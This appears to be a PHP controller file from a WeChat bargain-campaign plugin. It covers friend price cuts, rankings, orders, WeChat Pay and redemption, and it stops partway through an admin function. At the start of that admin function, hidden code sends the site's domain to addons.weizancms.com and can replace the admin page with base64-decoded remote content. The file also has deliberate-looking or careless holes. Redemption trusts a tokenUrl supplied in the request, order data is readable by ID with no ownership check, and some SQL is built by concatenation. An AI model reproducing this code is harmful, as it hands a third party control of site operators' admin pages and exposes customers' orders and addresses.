<?php
/**
 * www.efwww.com
 */
defined('IN_IA') or exit('Access Denied');
define("MON_XKWKJ", "mon_xkwkj");
define("MON_XKWKJ_RES", "../addons/" . MON_XKWKJ . "/");
require_once IA_ROOT . "/addons/" . MON_XKWKJ . "/dbutil.class.php";
require IA_ROOT . "/addons/" . MON_XKWKJ . "/oauth2.class.php";
require_once IA_ROOT . "/addons/" . MON_XKWKJ . "/value.class.php";
require_once IA_ROOT . "/addons/" . MON_XKWKJ . "/monUtil.class.php";
require_once IA_ROOT . "/addons/" . MON_XKWKJ . "/WxPayPubHelper/WxPayPubHelper.php";

/**
 * Class Mon_WkjModuleSite
 */
class Mon_XKWkjModuleSite extends WeModuleSite {
	public $weid;
	public $acid;
	public $oauth;
	public static $USER_COOKIE_KEY = "__monkxwkjuserv2122232";
    public static $GCODE = 1002;
	public static $KJ_STATUS_WKS = 0;//未开始
	public static $KJ_STATUS_ZC = 1;//正常
	public static $KJ_STATUS_JS = 2;//结束
	public static $KJ_STATUS_XD = 3;//已下单
	public static $KJ_STATUS_GM = 4;//已支付
	public static $KJ_STATUS_YFH = 5;//已发货

	public static $TIP_DIALOG = 1;//对话框
	public static $TIP_U_FIRST = 2;//首次
	public static $TIP_U_ALREADY = 3;//已经砍过了
	public static $TIP_RANK = 4;//页面
	public static $TIP_FK_FIRST = 5;//好友
	public static $TIP_FK_ALREADY = 6;//好友已看
	public static $PAGE_SIZE = 6;
	public $xkkjSetting;

	function __construct()
	{
		global $_W;
		$this->weid = $_W['uniacid'];
		$this->xkkjSetting = $this->findXKKJsetting();
		$this->oauth = new Oauth2($this->xkkjSetting['appid'], $this->xkkjSetting['appsecret']);
	}


	/************************************************手机*********************************/
	/**
	 * author: 
	 * 用户砍价页
	 */
	public function  doMobileIndex()
	{
		global $_W, $_GPC;
		$kid = $_GPC['kid'];
		MonUtil::checkmobile();
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
		MonUtil::emtpyMsg($xkwkj, "炫酷砍价活动不存在或已删除");
		$join = false;
		$userInfo =$this->getCookidUerInfo($kid);
		$user = $this->findJoinUser($kid, $userInfo['openid']);

		$starttime = date("Y/m/d  H:i:s", $xkwkj['starttime'] );
		$endtime = date("Y/m/d  H:i:s", $xkwkj['endtime'] );
		$curtime = date("Y/m/d  H:i:s", TIMESTAMP);
		$leftCount = $this->getLeftCount($xkwkj);
		$status = $this->getStatus($xkwkj, $user);
		$statusText = $this->getStatusText($status);
		$joinCount = $this->getJoinCount($xkwkj);


		$join_rank_num = $xkwkj['join_rank_num'];
		$ranklist = pdo_fetchall("SELECT * FROM " . tablename(DBUtil::$TABLE_XKWKJ_USER) . " WHERE kid =:kid   ORDER BY price asc, createtime desc limit 0,  ".$join_rank_num , array(':kid'=>$kid));

		if (!empty($user)) {   //已参加
			$orderInfo = $this->findOrderInfo($kid, $user['id']);

			$allowSubmit = false;
			if ($user['price'] <= $xkwkj['submit_money_limit']) {
				$allowSubmit = true;
			}

			if (!$allowSubmit) {
                $leftPrice = $user['price'] - $xkwkj['submit_money_limit'];
				$allowSubmitText = "您离提交订单金额还差" .$leftPrice . ",继续努力哦!" ;
			}
			include $this->template('m_kj');

		} else { //没有参加
            $kjPrice = $this->getKjPrice($xkwkj, $xkwkj['p_y_price']);
            $collectUserInfo = false;
			if ($this->xkkjSetting['is_collect_user_info'] == 1) { //要求手机用户注册信息
				 $uniUserInfo = $this->findUniUserInfo( $userInfo['openid'], $this->weid);

				if (empty($uniUserInfo['uname']) || empty($uniUserInfo['tel']) || empty($uniUserInfo)) {
					$collectUserInfo = true;
				}
			}

			include $this->template('m_index');
		}
	}


	/**
	 * author: 
	 * 排行榜
	 */
	public function  doMobileRank()
	{
		global $_W, $_GPC;
		$kid = $_GPC['kid'];
		MonUtil::checkmobile();
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
		MonUtil::emtpyMsg($xkwkj, "炫酷砍价活动不存在或已删除");
		$starttime = date("Y/m/d  H:i:s", $xkwkj['starttime'] );
		$endtime = date("Y/m/d  H:i:s", $xkwkj['endtime'] );
		$curtime = date("Y/m/d  H:i:s", TIMESTAMP);
		$leftCount = $this->getLeftCount($xkwkj);
		$status = $this->getStatus($xkwkj, null);
		$statusText = $this->getStatusText($status);
		$joinCount = $this->getJoinCount($xkwkj);

		$join_rank_num = $xkwkj['join_rank_num'];

		$list = pdo_fetchall("SELECT * FROM " . tablename(DBUtil::$TABLE_XKWKJ_USER) . " WHERE kid =:kid   ORDER BY price asc, createtime desc limit 0,  ".$join_rank_num , array(':kid'=>$kid));


		include $this->template("rank");


	}



	/**
	 * author: 
	 * 自砍一刀
	 */
	public  function doMobileSelfKj() {
		global $_W, $_GPC;

		$kid = $_GPC['kid'];
		$seq_weapon = $_GPC['seq_weapon'];
		$name_seq = $_GPC['name_seq'];
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
        $userInfo = $this->getCookidUerInfo($kid);
		
		if (empty($userInfo)) {
		    $res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '无法获取砍价人信息，请检查你的JS分享权限设置!';
			die(json_encode($res));
		}

       if ($xkwkj['join_follow_enable'] == 1 && empty($_W['fans']['follow'])) {
			$res['code'] = 2;
			$res['price'] = 0;
			$res['msg'] = '请关注公众号后再帮助好友砍价！';
			die(json_encode($res));
		}

		$joinUserCount = $this->findJoinUserCount($kid);
		if ($joinUserCount >= $xkwkj['join_user_limit']) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '对不起，参与砍价活动已满，下次再来吧!';
			die(json_encode($res));

		}

		$uniUserInfo = $this->findUniUserInfo($userInfo['openid'], $this->weid);

		if (empty($uniUserInfo)) {
			$userUniData = array(
				'weid' => $this->weid,
				'openid' => $userInfo['openid'],
				'nickname' => $userInfo['nickname'],
				'headimgurl' => $userInfo['headimgurl'],
				'uname' => $_GPC['funame'],
				'tel' => $_GPC['futel'],
				'createtime' => TIMESTAMP
			);

			DBUtil::create(DBUtil::$TABLE_XKWKJ_USER_INFO, $userUniData);//注册用户
		}



		$dbJoinUser=DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_USER,array(":kid"=>$kid,":openid"=>$userInfo['openid']));
		$res = array();
		if(empty($dbJoinUser)) {
			$userData = array(
				'kid' => $xkwkj['id'],
				'openid' => $userInfo['openid'],
				'nickname' => $userInfo['nickname'],
				'headimgurl' => $userInfo['headimgurl'],
				'price' => $xkwkj['p_y_price'],
				'ip' => $_W['clientip'],
				'createtime' => TIMESTAMP
			);
			DBUtil::create(DBUtil::$TABLE_XKWKJ_USER, $userData);//注册用户
			$uid = pdo_insertid();//用户ID
			$kj_res = $this->createFirendKj($xkwkj, $uid, $userInfo['openid'], $userInfo['nickname'], $userInfo['headimgurl'], $seq_weapon, $name_seq);
			$res['code'] = $kj_res[0];
			$res['price'] = $kj_res[1];
			$res['msg'] = $kj_res[2];
			die(json_encode($res));

		} else {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '您已经自己砍过了哦，不能再砍了哦';
			die(json_encode($res));
		}

	}

	/**
	 * author: 
	 * 好友砍刀
	 */
	public  function doMobileFriendfKj() {
		global $_W, $_GPC;
		$res = array();
		$kid = $_GPC['kid'];
		$seq_weapon = $_GPC['seq_weapon'];
		$name_seq = $_GPC['name_seq'];
		$uid = $_GPC['uid'];
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
        $user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER,$uid);

		if (empty($xkwkj)) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '砍价活动删除或不存在';
			die(json_encode($res));
		}

		if (TIMESTAMP > $xkwkj['endtime']) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '活动已结束';
			die(json_encode($res));
		}

		if (empty($user)) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '分享主人删除或不存在';
			die(json_encode($res));
		}


		$status = $this->getStatus($xkwkj, $user);


		if ($status != $this::$KJ_STATUS_ZC) {
			$statusText = $this->getStatusText($status);
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = $statusText;
			die(json_encode($res));
		}



		$friend = $this->getCookidUerInfo($kid);

		if (empty($friend)) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '无法获取砍价人信息，请检查你的JSSDK分享权限设置!';
			die(json_encode($res));
		}

		if ($xkwkj['kj_follow_enable'] == 1 && empty($_W['fans']['follow'])) {
			$res['code'] = 2;
			$res['price'] = 0;
			$res['msg'] = '请关注公众号后再帮助好友砍价！';
			die(json_encode($res));
		}


		$friendHelpCount = $this->findSameKJHelpCount($kid, $friend['openid']);

		if ($friendHelpCount >= $xkwkj['help_limit']) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '你帮助此商品砍价好友砍价已经超过次数啦,下次再来帮助好友吧！';
			die(json_encode($res));
		}


		$totalHelpProductCount = $this->findHelpProductCount($friend['openid']);

		if (!empty($this->xkkjSetting['help_kj_limit']) && $totalHelpProductCount >= $this->xkkjSetting['help_kj_limit']) {
			$res['code'] = 0;
			$res['price'] = 0;
			$res['msg'] = '您帮助不同的商品砍价已经超过次数啦，下次再来帮助砍价吧！';
			die(json_encode($res));
		}

		$kj_res = $this->createFirendKj($xkwkj, $uid, $friend['openid'], $friend['nickname'], $friend['headimgurl'], $seq_weapon, $name_seq);
		$res['code'] = $kj_res[0];
		$res['price'] = $kj_res[1];
		$res['msg'] = $kj_res[2];
		die(json_encode($res));
	}
	/**
	 * author: 
	 * 地址
	 */
	public function doMobileAddress() {
		global $_W, $_GPC;
		MonUtil::checkmobile();
		$kid = $_GPC['kid'];
		$uid = $_GPC['uid'];
		$userInfo = $this->getCookidUerInfo($kid);
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
        $user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $uid);
		$zfprice = $xkwkj['yf_price'] + $user['price'];
		$p_models=explode('|',$xkwkj['p_model']);


		$leftCount = $this->getLeftCount($xkwkj);

		include $this->template("address");
	}


	public function  getCookidUerInfo($kid) {
		//return array('openid'=>'o_-HajnJvvy-DqNuQp8q4a-m3T981');
		$userInfo = MonUtil::getClientCookieUserInfo($this::$USER_COOKIE_KEY . "" . $this->weid);
		return $userInfo;
	}
	/**
	 * author: 
	 * 砍价朋友页面
	 */
	public function doMobileKj()
	{

		global $_W, $_GPC;
		MonUtil::checkmobile();
		$kid = $_GPC['kid'];
		$uid = $_GPC['uid'];
		$fopenid = $_GPC['openid'];
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
		MonUtil::emtpyMsg($xkwkj, "砍价活动不存在或已删除!");
		$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $uid);
		MonUtil::emtpyMsg($user, "用户删除或不存在!");
		$firend = $this->getCookidUerInfo($kid);
		$userInfo = $this->getCookidUerInfo($kid);
		$userInfo['nickname'] = $user['nickname'];
		if ($firend['openid'] == $user['openid']) {//自己点了自己分析的链接
			$indexUrl = MonUtil::str_murl($this->createMobileUrl('index', array('kid' => $kid, 'openid' => $fopenid), true));
			header("location: $indexUrl");
			exit;
		}
		$joinCount = $this->getJoinCount($xkwkj);
        $leftCount = $this->getLeftCount($xkwkj);
		$starttime = date("Y/m/d  H:i:s", $xkwkj['starttime'] );
		$endtime = date("Y/m/d  H:i:s", $xkwkj['endtime'] );
		$curtime = date("Y/m/d  H:i:s", TIMESTAMP);


		$status = $this->getStatus($xkwkj, $user);
		$statusText = $this->getStatusText($status);

		$joinFirend = $this->findJoinUser($kid, $firend['openid']);
		$firendJoined = false;
		if (!empty($joinFirend)) {
			$firendJoined = true;// 哥们自己有参加过活动
		}

//		if ($xkwkj['one_kj_enable'] == 1) {
//			$dbFirend = $this->findHelpFirendLimit($kid, $firend['openid']);
//		} else {
//			$dbFirend = $this->findHelpFirend($uid, $firend['openid']);
//		}


		$dbFirend = $this->findHelpFirend($uid, $firend['openid']);

		$join_rank_num = $xkwkj['join_rank_num'];
		$ranklist = pdo_fetchall("SELECT * FROM " . tablename(DBUtil::$TABLE_XKWKJ_USER) . " WHERE kid =:kid   ORDER BY price asc, createtime desc limit 0,  ".$join_rank_num , array(':kid'=>$kid));

		$helped = false;
		if (!empty($dbFirend)) {
			$helped = true;//已经帮好友看过了。。。。。
			$follow = 1;
			if (!empty($_W['fans']['follow'])){
				$follow = 2;
			}

			include $this->template("firend_yk");

		} else {
			include $this->template("friend_index");
		}

	}

	public function getShareUrl($kid, $uid)
	{
		if (empty($uid)) {
			MonUtil::str_murl($this->createMobileUrl('Auth', array('kid' => $kid, 'au' => Value::$REDIRECT_USER_INDEX), true));
		} else {
			return MonUtil::str_murl($this->createMobileUrl('Auth', array('kid' => $kid, 'uid' => $uid, 'au' => Value::$REDIRECT_KJ), true));
		}
	}

	/**
	 * author: 
	 * @param $uid
	 * @param $fopenid
	 * @param $fnickname
	 * @param $fheadimgurl
	 * 砍价信息
	 */
	public function  createFirendKj($xkwkj, $uid, $fopenid, $fnickname, $fheadimgurl, $seq_weapon, $name_seq)
	{
		global $_W;
		$dbFirend = $this->findHelpFirend($uid, $fopenid);
		$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $uid);
		$leftCount = $this->getLeftCount($xkwkj);
		if ($leftCount <= 0) {
			return array(0,0, "库存已经没了，下次再来砍吧！");
		}

		if ($user['price'] <= $xkwkj['p_low_price']) {
			return array(0,0, "好友砍价过猛已经最低价啦，下次再来帮好友砍吧！");
		}

		$dayKjCount = $this->findDayKjCount($xkwkj['id'], $uid);

		if ($dayKjCount >= $xkwkj['day_help_count']) {
			return array(0,0, "亲，今天帮砍好友名额已够，明天再来帮好友砍价吧！");
		}

		$k_price = $this->getKjPrice($xkwkj, $user['price']);
		if (empty($dbFirend)) {
			$leftPrice = $user['price'] - $k_price;
			if ($leftPrice <= $xkwkj['p_low_price']) {
				$leftPrice = $xkwkj['p_low_price'];
			}
			$helpFirend = array(
				'kid' => $xkwkj['id'],
				'uid' => $uid,
				'openid' => $fopenid,
				'nickname' => $fnickname,
				'headimgurl' => $fheadimgurl,
				'ac' => '砍了',
				'k_price' => $k_price,
				'kh_price' => $leftPrice,
				'kd' => $seq_weapon,
				'kname' => $name_seq,
				'ip' => $_W['clientip'],
				'createtime' => TIMESTAMP
			);

			DBUtil::create(DBUtil::$TABLE_XKWKJ_FIREND, $helpFirend);
			DBUtil::updateById(DBUtil::$TABLE_XKWKJ_USER, array('price' => $leftPrice), $uid);

			$this->sendTemplateMsg($xkwkj, $fnickname, $k_price, $leftPrice, $user['openid']);

		} else{
			return array(0,0, "已经帮好友砍过价了，下次再继续吧！！");
		}

		return array(1,$k_price, $this->getTipMsg($xkwkj, $this::$TIP_DIALOG));

	}

	/**
	 * author: 
	 * 砍价高手
	 */
	public function doMobileKjFirendList() {
		global $_W, $_GPC;
		$uid = $_GPC['uid'];
		$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $uid);
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $user['kid']);
		$friends = array();
		if (!empty($uid)) {
			$sql = "select nickname as user_name, ac as action, kname as seq_name ,kd as seq_weapon, k_price as amount, createtime as time, headimgurl as avatar from"
				. tablename(DBUtil::$TABLE_XKWKJ_FIREND) . " where uid=:uid order by createtime desc  limit 0,".$xkwkj['rank_num'];
			$friends = pdo_fetchall($sql, array(":uid" => $uid));
		}

		$res = array();
		$res["Status"] = 1;
		$res["Message"] = "";
		$res["Data"] = $friends;
		die(json_encode($res));
   }



	/**
	 * author: 
	 * 订单提交
	 */
	public function  doMobileOrderSubmit()
	{
		global $_W, $_GPC;
		MonUtil::checkmobile();
		$uid = $_GPC['uid'];
		$kid = $_GPC['kid'];
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
		$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $uid);
		$uname = $_GPC['uname'];
		$address = $_GPC['address'];
		$tel = $_GPC['tel'];
		$zipcode = $_GPC['zipcode'];
		$p_model=$_GPC['p_model'];
		MonUtil::emtpyMsg($xkwkj, "砍价活动不存在或已删除");
		MonUtil::emtpyMsg($user, "用户不存在或已删除");
		$orderInfo = $this->findOrderInfo($kid, $uid);
		$orderNo = $this->getOrderNo($kid, $uid);
		 $leftCount = $this->getLeftCount($xkwkj) -1;
		 if ($leftCount < 0) {
			 message("库存已不足，下次再参加活动吧!");
		 }
		
		if (empty($orderInfo)) {//没有该用户的订单 信息
			$order_array = array(
				'order_no' => $orderNo,
				'kid' => $xkwkj['id'],
				'uid' => $user['id'],
				'uname' => $uname,
				'address' => $address,
				'tel' => $tel,
				'zipcode' => $zipcode,
				'openid' => $user['openid'],
				'y_price' => $xkwkj['p_y_price'],
				'kh_price' => $user['price'],
				'yf_price' => $xkwkj['yf_price'],
				'total_price' => $user['price'] + $xkwkj['yf_price'],
				'status' => $this::$KJ_STATUS_XD,
				'p_model'=>$p_model,
				'createtime' => TIMESTAMP

			);

			DBUtil::create(DBUtil::$TABLE_XKWJK_ORDER, $order_array);
			$oid = pdo_insertid();
			$orderInfo = DBUtil::findById(DBUtil::$TABLE_XKWJK_ORDER, $oid);
		}

		if ($orderInfo['status'] == $this::$KJ_STATUS_XD && $xkwkj['pay_type'] == 1) {//立即支付
			$this->toPayTemplate($user, $orderInfo, $xkwkj);
		} else if ($orderInfo['status'] == $this::$KJ_STATUS_XD && $xkwkj['pay_type'] == 2) {//货到付款
			include $this->template('orderInfo');
		}

	}

	/**
	 * author: 
	 * 付款
	 */
    public function doMobilePay() {
		global $_W, $_GPC;
		$oid = $_GPC['oid'];
		$orderInfo = DBUtil::findById(DBUtil::$TABLE_XKWJK_ORDER, $oid);
		MonUtil::emtpyMsg($orderInfo, "订单删除或不存在");

		$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $orderInfo['uid']);
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $orderInfo['kid']);
		$userInfo = $this->getCookidUerInfo($xkwkj['id']);
        $this->toPayTemplate($user, $orderInfo, $xkwkj);
	}
	public function toPayTemplate($user,$orderInfo, $xkwkj) {
		global $_W;
		$jsApi = new JsApi_pub($this->xkkjSetting);
		$jsApi->setOpenId($user['openid']);
		$unifiedOrder = new UnifiedOrder_pub($this->xkkjSetting);
		$unifiedOrder->setParameter("openid", $user['openid']);//商品描述
		$unifiedOrder->setParameter("body", "砍价商品" . $xkwkj['p_name']);//商品描述
		$out_trade_no = date('YmdHis', time()). "o".$orderInfo['id'];

		$unifiedOrder->setParameter("out_trade_no", $out_trade_no);//商户订单号
		//$orderInfo['total_price']
		//$unifiedOrder->setParameter("total_fee", 1);//总金额
		$unifiedOrder->setParameter("total_fee", $orderInfo['total_price']*100);//总金额
		$notifyUrl = $_W['siteroot'] . "addons/" . MON_XKWKJ . "/notify.php";
		$unifiedOrder->setParameter("notify_url", $notifyUrl);//通知地址
		$unifiedOrder->setParameter("trade_type", "JSAPI");//交易类型
		$prepay_id = $unifiedOrder->getPrepayId();
		$jsApi->setPrepayId($prepay_id);
		DBUtil::updateById(DBUtil::$TABLE_XKWJK_ORDER, array('outno' => $out_trade_no), $orderInfo['id']);
		$jsApiParameters = $jsApi->getParameters();
		//$gmCount = $this->getOrderCount($xkwkj['id'], $this::$KJ_STATUS_GM);
		$leftCount = $this->getLeftCount($xkwkj);
		//$leftCount = 3;
		$orderInfo = $this->findOrderInfo($xkwkj['id'], $user['id']);
		include $this->template('order_pay');

	}

	/**
	 * author: weizan 
	 * 订单
	 */
	public function  doMobileOrderInfo()
	{
		global $_W, $_GPC;
		MonUtil::checkmobile();
		$kid = $_GPC['kid'];
		$uid = $_GPC['uid'];
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $kid);
		$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $uid);
		$userInfo = $this->getCookidUerInfo($xkwkj['id']);
		MonUtil::emtpyMsg($xkwkj, "砍价活动删除或不存在");
		MonUtil::emtpyMsg($user, "用户删除或不存在");
		$orderInfo = $this->findOrderInfo($kid, $uid);
		MonUtil::emtpyMsg($orderInfo, "您还未提交订单");


		include $this->template('orderInfo');

	}

	public function  doMobileQrcode() {
		global $_W, $_GPC;
		$oid = $_GPC['oid'];
		$order = DBUtil::findById(DBUtil::$TABLE_XKWJK_ORDER, $oid);
		$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $order['kid']);


		$qrcode = $this->getScanCode($oid);

		if ($order['status'] == $this::$KJ_STATUS_XD || $order['status'] == $this::$KJ_STATUS_GM) {
			$statusText = '未兑换';
		}

		if ($order['status'] == $this::$KJ_STATUS_YFH) {
			$statusText = '已兑换';
		}

		include $this->template("qrcode");
	}



	public function getScanCode($oid) {
		$codeArray = array(
			'exeUrl' => MonUtil::str_murl($this->createMobileUrl('ExchangeApi', array('oid'=> $oid), true)),
			'gcode' => $this::$GCODE
		);
		return base64_encode(json_encode($codeArray));
	}

	/**
	 * author: 
	 * 对接兑换中心 url
	 */
	public function doMobileExchangeApi()
	{
		global $_GPC, $_W;
		$oid = $_GPC['oid'];
		$order = DBUtil::findById(DBUtil::$TABLE_XKWJK_ORDER, $oid);
		$res = array();


		if (empty($order)) {
			$res['res'] = 'fail';
			$res['msg'] = '砍价记录删除或不存在';
			die(json_encode($res));
		}

		if ($order['status'] == $this::$KJ_STATUS_YFH) {
			$res['res'] = 'fail';
			$res['msg'] = '已兑换，不能重复兑换！';
			die(json_encode($res));
		}

		$tokenUrl = urldecode($_GPC['tokenUrl']);
		$token = $_GPC['token'];

		if (empty($tokenUrl) || empty($token)) {
			$res['res'] = 'fail';
			$res['msg'] = '核销人员信息信息错误';
			die(json_encode($res));
		}

		load()->func('communication');
		//验证核销人员
		$result = ihttp_post($tokenUrl, array('token' => $token));
		$resultJson = json_decode(substr($result['content'], 3), true);

		if (empty($resultJson)) {
			$resultJson = json_decode($result['content'], true);
		}

		if (empty($resultJson)) {
			$res['res'] = 'fail';
			$res['msg'] = '验证核销人员返回为空';
			die(json_encode($res));
		} else {
			if ($resultJson['code'] == 200) {

				$xkwkj = DBUtil::findById(DBUtil::$TABLE_XKWKJ, $order['kid']);
				if ($xkwkj['pay_type'] == 1 && $order['status'] != $this::$KJ_STATUS_GM) {
					$res['res'] = 'fail';
					$res['msg'] = '订单没有支付!';
					die(json_encode($res));
				}
				//开始执行核销
				DBUtil::updateById(DBUtil::$TABLE_XKWJK_ORDER, array('status'=>$this::$KJ_STATUS_YFH), $oid );
				$user = DBUtil::findById(DBUtil::$TABLE_XKWKJ_USER, $order['uid']);
				$res['res'] = 'success';
				$res['uname'] = $order['uname'];
				$res['unickname'] = $user['nickname'];
				$res['utel'] = $order['tel'];
				$res['pname'] = $xkwkj['p_name'];
				$res['remark'] = '炫酷砍价兑换成功';
				die(json_encode($res));

			} else {
				$res['res'] = 'fail';
				$res['msg'] = '核销人员删除或不存在!';
				die(json_encode($res));
			}
		}
	}

	/**
	 * author: weizan 
	 * @param $kid
	 * @param $uid
	 * @return string
	 * 订单号
	 */
	public function  getOrderNo($kid, $uid)
	{
		return date('YmdHis', time()) . "k" . $kid . "u" . $uid;
	}

	public function  doMobileAuth()
	{
		global $_GPC, $_W;
		$au = $_GPC['au'];
		$kid = $_GPC['kid'];
		$uid = $_GPC['uid'];
		$params = array();
		$params['kid'] = $kid;
		$params['au'] = $au;
		$params['uid'] = $uid;
		$userInfo = $this->getClientUserInfo();
		if (empty($userInfo)) {//授权
			$redirect_uri = MonUtil::str_murl($this->createMobileUrl('Auth2', $params, true));
			$this->oauth->authorization_code($redirect_uri, Oauth2::$SCOPE_USERINFO, 1);//进行授权

		} else {
			$params['openid'] = $userInfo['openid'];
			$redirect_uri = $this->getRedirectUrl($au, $params);
			header("location: $redirect_uri");
		}

	}

	public function getClientUserInfo() {
		//return array('openid'=>'o_-HajnJvvy-DqNuQp8q4a-m3T981');
		$userInfo = MonUtil::getClientCookieUserInfo(Mon_XKWkjModuleSite::$USER_COOKIE_KEY . "" . $this->weid);
		return $userInfo;
	}

	public function  doMobileAuth2()
	{
		global $_GPC;
		$kid = $_GPC['kid'];
		$uid = $_GPC['uid'];
		$code = $_GPC ['code'];
		$au = $_GPC['au'];
		$tokenInfo = $this->oauth->getOauthAccessToken($code);
		$userInfo = $this->oauth->getOauthUserInfo($tokenInfo['openid'], $tokenInfo['access_token']);
		MonUtil::setClientCookieUserInfo($userInfo, $this::$USER_COOKIE_KEY . "" . $this->weid);//保存到cookie
		$params = array();
		$params['kid'] = $kid;
		$params['au'] = $au;
		$params['uid'] = $uid;
		$params['openid'] = $tokenInfo['openid'];
		$redirect_uri = $this->getRedirectUrl($au, $params);
		header("location: $redirect_uri");
	}

	/**
	 * 首页
	 */
	public function doMobileHomeIndex() {
		global $_W;
		$userInfo = $this->getClientUserInfo();

		$uidSql = " (select id from ".tablename(DBUtil::$TABLE_XKWKJ_USER)." u where u.openid=:openid and u.kid=k.id) as uid ";
		$listSql = "select k.id, k.p_name, k.p_y_price, k.p_low_price, k.p_preview_pic, ".$uidSql."from ".tablename(DBUtil::$TABLE_XKWKJ) . " k where k.show_index_enable=1 and k.weid=:weid order by index_sort asc limit 0,". $this::$PAGE_SIZE;
		$params = array(
			":openid"=>$userInfo['openid'],
			":weid"=> $this->weid
		);

		$list = pdo_fetchall($listSql, $params);
		$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename(DBUtil::$TABLE_XKWKJ) . " k where  weid=:weid and k.show_index_enable=1 " , array(":weid"=>$this->weid));
		$next = false;
		if ($total > $this::$PAGE_SIZE) {
			$next = true;
		}
		$indexsetting = DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_INDEX_SETTING, array(':weid' => $this->weid));
		include  $this->template("home_index");
	}

	public function doMobileHomePage() {
		global $_GPC;
		$userInfo = $this->getClientUserInfo();
		$page_size = $this::$PAGE_SIZE;
		$page = max(1, intval($_GPC['page']));
		$start= $page_size + ($page - 1) * $page_size;
		$uidSql = " (select id from ".tablename(DBUtil::$TABLE_XKWKJ_USER)." u where u.openid=:openid and u.kid=k.id) as uid ";
		$listSql = "select  k.id, k.p_name, k.p_y_price, k.p_low_price, k.p_preview_pic, ".$uidSql."from ".tablename(DBUtil::$TABLE_XKWKJ) . " k where k.show_index_enable=1 and k.weid=:weid order by index_sort asc limit ".$start.",". $page_size;
		$params = array(
			":openid"=>$userInfo['openid'],
			":weid"=> $this->weid
		);

		$list = pdo_fetchall($listSql, $params);

		if (empty($list)) {
			echo "";
			exit;
		}
		include $this->template("index_page");
	}

	public function doMobileMyKjList() {
		global $_GPC,$_W;
		$userInfo = $this->getClientUserInfo();
		if (empty($userInfo)) {
			message("您未登录，或登录已失效");
		}

		$listSql = "select u.id, k.id, k.p_name, k.p_y_price, k.p_low_price, k.p_preview_pic from ".tablename(DBUtil::$TABLE_XKWKJ_USER). " u left join "
			.tablename(DBUtil::$TABLE_XKWKJ). " k on u.kid=k.id where k.show_index_enable=1 and k.weid=:weid and u.openid=:openid order by k.index_sort asc limit 0,".$this::$PAGE_SIZE;

		$countSql = "select count(*) from ".tablename(DBUtil::$TABLE_XKWKJ_USER). " u left join "
			.tablename(DBUtil::$TABLE_XKWKJ). " k on u.kid=k.id where k.show_index_enable=1 and k.weid=:weid and u.openid=:openid";
		$params = array(
			":openid"=>$userInfo['openid'],
			":weid"=> $this->weid
		);
		$list = pdo_fetchall($listSql, $params);
		$total = pdo_fetchcolumn($countSql , $params);
		$next = false;
		if ($total > $this::$PAGE_SIZE) {
			$next = true;
		}
		$indexsetting = DBUtil::findUnique(DBUtil::$TABLE_XKWKJ_INDEX_SETTING, array(':weid' => $this->weid));
		include $this->template("my_kj_list");
	}

	public function doMobileMyKjPage() {
		global $_GPC;
		$page_size = $this::$PAGE_SIZE;
		$page = max(1, intval($_GPC['page']));
		$start= $page_size + ($page - 1) * $page_size;
		$userInfo = $this->getClientUserInfo();
		if (empty($userInfo)) {
			echo "";
		}

		$listSql = "select u.id, k.id, k.p_name, k.p_y_price, k.p_low_price, k.p_preview_pic from ".tablename(DBUtil::$TABLE_XKWKJ_USER). " u left join "
			.tablename(DBUtil::$TABLE_XKWKJ). " k on u.kid=k.id where k.show_index_enable=1 and k.weid=:weid and u.openid=:openid order by k.index_sort asc limit ".$start.",".$this::$PAGE_SIZE;

		$countSql = "select count(*) from ".tablename(DBUtil::$TABLE_XKWKJ_USER). " u left join "
			.tablename(DBUtil::$TABLE_XKWKJ). " k on u.kid=k.id where k.show_index_enable=1 and k.weid=:weid and u.openid=:openid";
		$params = array(
			":openid"=>$userInfo['openid'],
			":weid"=> $this->weid
		);
		$list = pdo_fetchall($listSql, $params);
		if (empty($list)) {
			echo "";
			exit;
		}
		include $this->template("index_page");
	}

	/************************************************管理*********************************/

	/**
	 * 活动管理
	 */
	public function  doWebXKKjManage()
	{

		global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
		if ($operation == 'display') {

			$pindex = max(1, intval($_GPC['page']));
			$psize = 20;
